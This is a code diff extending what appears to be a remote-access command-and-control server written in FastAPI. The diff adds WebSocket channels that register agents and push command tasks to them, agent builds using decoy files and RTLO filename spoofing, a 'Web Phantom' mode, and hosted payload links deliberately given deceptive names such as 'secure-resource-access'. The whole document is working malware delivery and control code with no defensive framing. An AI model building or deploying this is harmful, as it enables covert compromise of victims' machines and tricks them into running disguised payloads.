@@ -14,6 +14,7 @@ from datetime import datetime, timedelta
 import subprocess
 import tempfile
 import shutil
+import uuid
 from pydantic import BaseModel
 from .auth import create_access_token, get_current_user, verify_password, get_password_hash
 from fastapi.security import OAuth2PasswordRequestForm
@@ -31,6 +32,7 @@ store = DataStore()
 class ConnectionManager:
     def __init__(self):
         self.active_connections: List[WebSocket] = []
+        self.agent_connections: Dict[str, WebSocket] = {}
 
     async def connect(self, websocket: WebSocket):
         await websocket.accept()
@@ -38,6 +40,22 @@ class ConnectionManager:
 
     def disconnect(self, websocket: WebSocket):
         self.active_connections.remove(websocket)
+        # Remove from agent mapping if present
+        for aid, ws in list(self.agent_connections.items()):
+            if ws == websocket:
+                del self.agent_connections[aid]
+
+    def register_agent_connection(self, agent_id: str, websocket: WebSocket):
+        self.agent_connections[agent_id] = websocket
+
+    async def send_to_agent(self, agent_id: str, message: dict):
+        if agent_id in self.agent_connections:
+            try:
+                await self.agent_connections[agent_id].send_json(message)
+                return True
+            except:
+                return False
+        return False
 
     async def broadcast(self, message: dict):
         for connection in self.active_connections:
@@ -47,6 +65,11 @@ class ConnectionManager:
                 pass
 
 manager = ConnectionManager()
+
+# Ensure payloads directory exists
+PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
+if not os.path.exists(PAYLOADS_DIR):
+    os.makedirs(PAYLOADS_DIR)
 
 # Mount static files and templates
 app.mount("/static", StaticFiles(directory="server/static"), name="static")
@@ -199,6 +222,16 @@ async def create_task(req: TaskRequest, user: str = Depends(get_current_user)):
             task_payload = {"command": parts[0], "args": parts[1:]}
 
     task_id = store.add_task(req.agent_id, req.task_type, task_payload, expires_at)
+    
+    # Try pushing via WebSocket for real-time agents (Web Phantom)
+    await manager.send_to_agent(req.agent_id, {
+        "event": "task_created",
+        "agent_id": req.agent_id,
+        "id": task_id,
+        "type": req.task_type,
+        "payload": task_payload
+    })
+
     await manager.broadcast({"event": "task_created", "agent_id": req.agent_id, "task_id": task_id})
     return {"status": "task_created", "task_id": task_id}
 
@@ -207,7 +240,63 @@ async def websocket_endpoint(websocket: WebSocket):
     await manager.connect(websocket)
     try:
         while True:
-            await websocket.receive_text()
+            data = await websocket.receive_text()
+            try:
+                msg = json.loads(data)
+                event = msg.get("event")
+                
+                if event == "register":
+                    agent_id = msg.get("agent_id")
+                    info = msg.get("info")
+                    version = msg.get("version", "1.0.0")
+                    agent_type = msg.get("agent_type", "binary")
+                    
+                    store.register_agent(agent_id, info, version, agent_type)
+                    manager.register_agent_connection(agent_id, websocket)
+                    await manager.broadcast({"event": "agent_updated", "agent_id": agent_id})
+                    print(f"[*] Registered {agent_type} agent: {agent_id}")
+                    
+                    # Auto-push pending tasks on registration
+                    pending = store.get_pending_tasks(agent_id)
+                    for t in pending:
+                        await manager.send_to_agent(agent_id, {
+                            "event": "task_created",
+                            "agent_id": agent_id,
+                            "id": t.id,
+                            "type": t.type,
+                            "payload": t.payload
+                        })
+
+                elif event == "get_tasks":
+                    agent_id = msg.get("agent_id")
+                    pending = store.get_pending_tasks(agent_id)
+                    for t in pending:
+                        await manager.send_to_agent(agent_id, {
+                            "event": "task_created",
+                            "agent_id": agent_id,
+                            "id": t.id,
+                            "type": t.type,
+                            "payload": t.payload
+                        })
+
+                elif event == "task_result":
+                    agent_id = msg.get("agent_id")
+                    task_id = msg.get("task_id")
+                    result = msg.get("result")
+                    
+                    store.update_task_result(task_id, result)
+                    await manager.broadcast({
+                        "event": "task_updated", 
+                        "agent_id": agent_id, 
+                        "task_id": task_id,
+                        "result": result
+                    })
+                    print(f"[*] Task result from {agent_id}: {task_id}")
+
+            except json.JSONDecodeError:
+                pass
+            except Exception as e:
+                print(f"[!] WebSocket Error: {e}")
     except WebSocketDisconnect:
         manager.disconnect(websocket)
 
@@ -237,10 +326,33 @@ async def build_agent(
     identity: str = Form(...),
     decoy: UploadFile = File(None),
     rtlo: bool = Form(False),
+    mode: str = Form("binary"),
     user: str = Depends(get_current_user)
 ):
-    """Generates a configured agent executable with optional decoy file and RTLO spoofing."""
+    """Generates a configured agent (Binary EXE or Web Phantom) with optional masking."""
     try:
+        # Handle Web Phantom mode (Bypasses PyInstaller)
+        if mode == "web":
+            payload_id = str(uuid.uuid4())[:8]
+            payload_storage_dir = os.path.join(PAYLOADS_DIR, payload_id)
+            os.makedirs(payload_storage_dir, exist_ok=True)
+            
+            # Create a marker for the download route to know it's a web payload
+            with open(os.path.join(payload_storage_dir, "type.web"), "w") as f:
+                f.write("web_phantom")
+            
+            # Use a deceptive name for the URL
+            deceptive_name = "secure-resource-access"
+            download_url = f"/p/{payload_id}/{deceptive_name}"
+            
+            return {
+                "status": "success",
+                "download_url": download_url,
+                "filename": deceptive_name,
+                "payload_id": payload_id,
+                "mode": "web"
+            }
+
         # 1. Setup temporary workspace
         with tempfile.TemporaryDirectory() as tmp_dir:
             project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -351,20 +463,65 @@ AGENT_IDENTITY={identity}
             with open(exe_path, "rb") as f:
                 content = f.read()
             
-            # 8. Stream back the file
-            # Encode filename for header to avoid latin-1 errors with RTLO
-            filename_quoted = urllib.parse.quote(deceptive_name)
-            content_disposition = f"attachment; filename=\"dali_agent.exe\"; filename*=UTF-8''{filename_quoted}"
+            # 8. Save to hosted payloads directory for "Agent by URL"
+            payload_id = str(uuid.uuid4())[:8]
+            payload_storage_dir = os.path.join(PAYLOADS_DIR, payload_id)
+            os.makedirs(payload_storage_dir, exist_ok=True)
             
-            return StreamingResponse(
-                io.BytesIO(content),
-                media_type="application/octet-stream",
-                headers={"Content-Disposition": content_disposition}
-            )
+            # Save with original name on disk for stability
+            hosted_path = os.path.join(payload_storage_dir, original_name)
+            with open(hosted_path, "wb") as f:
+                f.write(content)
+            
+            # 9. Return JSON with download info
+            # We use a friendly URL structure: /p/{id}/{deceptive_name}
+            download_url = f"/p/{payload_id}/{deceptive_name}"
+            
+            return {
+                "status": "success",
+                "download_url": download_url,
+                "filename": deceptive_name,
+                "payload_id": payload_id,
+                "mode": "binary"
+            }
             
     except Exception as e:
         print(f"[!] Build error: {e}")
+        import traceback
+        traceback.print_exc()
         raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/p/{payload_id}/{filename}")
+async def download_hosted_payload(payload_id: str, filename: str, request: Request):
+    """Serves a hosted payload with the specified filename in headers."""
+    target_dir = os.path.join(PAYLOADS_DIR, payload_id)
+    if not os.path.exists(target_dir):
+        raise HTTPException(status_code=404, detail="Payload not found")
+    
+    # Check if this is a Web Phantom payload
+    if os.path.exists(os.path.join(target_dir, "type.web")):
+        # Return the web phantom landing page
+        return templates.TemplateResponse("web_phantom.html", {"request": request})
+
+    files = [f for f in os.listdir(target_dir) if not f.startswith("type.")]
+    if not files:
+        raise HTTPException(status_code=404, detail="Payload empty")
+    
+    # We take the first file in the unique directory
+    file_path = os.path.join(target_dir, files[0])
+    
+    with open(file_path, "rb") as f:
+        content = f.read()
+    
+    # Use the filename from the URL for the download name
+    filename_quoted = urllib.parse.quote(filename)
+    content_disposition = f"attachment; filename=\"{filename}\"; filename*=UTF-8''{filename_quoted}"
+    
+    return StreamingResponse(
+        io.BytesIO(content),
+        media_type="application/octet-stream",
+        headers={"Content-Disposition": content_disposition}
+    )
 
 if __name__ == "__main__":
     host = os.getenv("SERVER_HOST", "0.0.0.0")
